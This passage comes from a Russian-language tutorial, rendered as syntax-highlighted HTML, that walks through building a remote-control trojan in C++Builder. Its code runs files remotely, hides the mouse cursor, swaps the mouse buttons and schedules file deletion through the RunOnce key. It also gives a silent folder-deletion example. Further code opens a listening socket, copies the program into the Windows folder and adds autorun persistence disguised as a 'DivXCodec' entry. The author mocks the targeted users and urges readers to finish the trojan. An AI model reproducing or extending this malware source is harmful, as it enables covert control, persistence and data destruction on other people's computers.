new,monospace'; font-size:12px; color:#303830;">, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, SW_SHOWNORMAL</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Запущен файл &quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">+f</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Файл запускается в той программе, с которой ассоциирован запуск данного типа файлов, т.е. вы можете запускать не толкьо exe, com, bat, но и любые другие файлы. Html-файл откроется в Explorer'e, Opere, Netscape или еще в чем-то... Хрен знает чем там ламерюга пользуется... Можете запустить ему мп3-шку Децла послушать или Бритни какой-нить, пусть проблюется =)    Идем дальше. Парочка бесполезных функций:    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TTrojanUtilites::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">HideMouse</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />ShowCursor</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">false</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Курсор мыши скрыт&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">No commentz...    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TTrojanUtilites::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">SwapMouseButtons</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />SwapMouseButton</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Кнопки мыши переключены&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Можно сделать переключение кнопок обратно (передайте в SwapMouseButton параметр false), но я бы посоветовал поставить таймер и каждую секунду переключать кнопки туда-сюда, веселее будет =) В падлу сейчас уже добавлять, но вкратце это будет так: добавляем TTimer на форму, устанавливаем необходимый интервал, и в обработчике события OnTimer прописываем вызов функции SwapMouseButton с параметром, противоположным прошлому вызову. Млин, все-таки все расписал =)    Теперь довольно важная функция:    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TTrojanUtilites::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">DeleteFile</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">String f</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">!FileExists</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">f</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Файл не существует.&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">return</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />TRegistry* Reg=</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">new</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TRegistry;<br />Reg-&gt;RootKey = HKEY_LOCAL_MACHINE;<br />Reg-&gt;OpenKey</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Software</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Microsoft</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Windows</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">CurrentVersion</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">RunOnce&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Reg-&gt;WriteString</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Filez for delete&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;command.com /c del &quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">+f</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Reg-&gt;CloseKey</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Sock-&gt;Socket-&gt;Connections</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">0</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">-&gt;SendText</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;Файл &quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">+f+</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot; будет удален после перезагрузки.&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">}</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Данная функция НЕ удаляет файл сразу!!! Это сделано специально, так как файлы могут использоваться системой и их удаление возможно только после перезагрузки, данная функция помечает файл к удалению, а удалиться он только после перезагрузки, которую вы легко можете вызвать. Да, еще маленькое примечание: данная функция удаляет только 1 файл, если вы пометите второй файл к удалению - то будет удален только он. А первый останется нетронутым... Немного измените функцию - и можно будет удалять файлы пачками =) Могу еще добавить немного инфы на случай, если надо будет удалить целый каталог и вы точно знаете что в нем нет открытых файлов. Используйте стандартную API функцию SHFileOperation, установив тип операции wFunc в FO_DELETE. Пример:    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">int</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> res;<br />SHFILEOPSTRUCT fo;<br />ZeroMemory</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">&amp;fo, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">sizeof</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">fo</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />fo.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">hwnd</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">   = hwndOwner;  </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// хэндл окна-владельца прогресс-диалога</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />fo.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">pFrom</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">  = pszFullPath; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">//путь</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />fo.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">wFunc</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">  = FO_DELETE;<br />fo.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">fFlags</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> = FOF_NOCONFIRMATION; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">//не спрашивать подтверждения на удаление</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />res = SHFileOperation</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">&amp;fo</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /> </span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'tahoma'; font-size:13px; color:#303830; background-color:#ffffff;">Только внимательно все проверьте! Будет обломно если ламерюга &quot;вдруг&quot; увидит надпись &quot;Папка голые тетки не может быть удалена, так как юзер активно смотрит сразу 10 порно-фильмов из нее!&quot;. А вообще, если опять удалиться в теорию, то наш главный объект Application имеет несколько полезных событий, наиболее интересное для нас OnException происходит тогда, когда в приложении возникает необработанная исключительная ситуация (деление на ноль, удаление несуществующего файла etc). По умолчанию, обработчик этого события вызывает метод ShowException для отображения окна сообщения с пояснением причины ошибки (оно нам надо?! конечно, НЕТ!). Но, вы можете изменить реакцию на событие onException, переписав его обработчик. Тут ничего трудного нет, просто я не ставил перед собой задачу написать офигенный троян, только подтолкнуть вас к этому =) Кто захочет - допишет все необходимое сам, если что - я подскажу =) Ну вот, вроде бы все функции реализовали. Теперь немного о том, что мы не сделали =) Мы не сделали: загрузку/закачку файла. Это все можно сделать подправив SendFile(). Стандартных функций для пересылки файлов через TClient(Server)Socket я не нашел, но впрочем, это не проблема - просто передавайте файлы фрагментами.    Теперь нам осталось только разобраться с автозагрузкой трояна. Сделаем следующее: 1) при запуске файл переписывается в папку, в которой установлены винды. 2) прописываем запуск нашего файла в реестре.    Реализуем =)    </span></p>
<p style=" margin-top:10px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; background-color:#f4f4f0;"><span style=" font-family:'tahoma'; font-size:10px; font-weight:600; color:#c0c0c0;">C++</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">void</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> __fastcall TForm1::</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">FormCreate</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">TObject *Sender</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />ServSckt-&gt;Port = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">4321</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />ServSckt-&gt;Active = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">Sock</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">=ServSckt;<br />Utilz.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">CDROMOPEN</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">=</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">false</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; <br /> <br />String WinDir;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">char</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> WinDir1</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">[</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">144</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">]</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />GetWindowsDirectory</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">WinDir1,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">144</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />WinDir=WinDir1; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// папка с установленными виндами</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> <br /> <br />String data;<br />TRegistry *pReg = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000dd;">new</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> TRegistry;<br />pReg-&gt;RootKey=HKEY_LOCAL_MACHINE;<br />pReg-&gt;OpenKey</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Software</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Microsoft</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Windows</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">CurrentVersion</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">Run&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">true</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />data=pReg-&gt;ReadString</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;DivXCodec&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">data != Application-&gt;ExeName</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">//если нашу программу стерли из</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// автозагрузки (DivXCodec - можете поменять по желанию на любое другое название раздела)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />     pReg-&gt;WriteString</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;DivXCodec&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,WinDir+</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">task16man.exe&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">//добавляем ее по новой</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> <br /> <br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">Application-&gt;ExeName!=WinDir+</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">task16man.exe&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">//если файл запустили 1ый раз</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br /></span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">if</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">!FileExists</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">WinDir+</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">task16man.exe&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">))</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">{</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        String dest=WinDir+</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; font-weight:600; color:#666666;">\\</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#666666;">task16man.exe&quot;</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">BOOL</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"> res=MoveFile</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">Application-&gt;ExeName.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">c_str</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">, dest.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">c_str</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">())</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">;<br />        </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// переписываем файл к виндам</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        ServSckt-&gt;Active = </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">false</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; <br />        ShellExecute</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">(</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">NULL</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">NULL</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,dest.</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#00eeff;">c_str</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">NULL</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">NULL</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">,</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#0000ff;">NULL</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">)</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">//запускаем его</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        Application-&gt;Terminate</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#000000;">()</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;">; </span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#ff0000;">// это приложение закрываем</span><span style=" font-family:'courier new,monospace'; font-size:12px; color:#303830;"><br />        </span><span style=" 